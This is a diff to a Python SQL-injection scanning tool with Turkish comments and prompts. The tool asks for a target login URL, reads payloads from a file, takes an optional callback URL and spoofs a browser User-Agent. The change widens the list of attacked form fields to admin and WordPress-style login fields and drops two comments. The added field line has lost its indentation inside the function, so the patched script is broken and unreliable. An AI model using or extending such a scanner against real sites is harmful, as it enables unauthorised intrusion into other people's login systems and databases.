@@ -22,7 +22,7 @@ def advanced_sqli_scan_v4_1(target_url, payload_file, callback_url=None):
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
     }
 
-    input_fields = ['uname', 'pass']
+input_fields = ['uname', 'pass', 'user_login', 'user_pass', 'email', 'admin_id']
 
     with requests.Session() as s:
         vuln_found = False
@@ -84,7 +84,6 @@ def advanced_sqli_scan_v4_1(target_url, payload_file, callback_url=None):
     else:
         print(f"\n[-] Tarama bitti. Hiçbir payload işe yaramadı.")
 
-# --- İŞTE BU KISIM EKSİKSE ÇALIŞMAZ ---
 if __name__ == "__main__":
     target_input = input("Hedef URL (Örn: http://site.com/login.php): ").strip()
     
@@ -94,5 +93,4 @@ if __name__ == "__main__":
     if target_input:
         advanced_sqli_scan_v4_1(target_input, 'payloads.txt', callback_input)
     
-    # Ekran hemen kapanmasın diye:
     input("\nÇıkmak için Enter'a basın...")
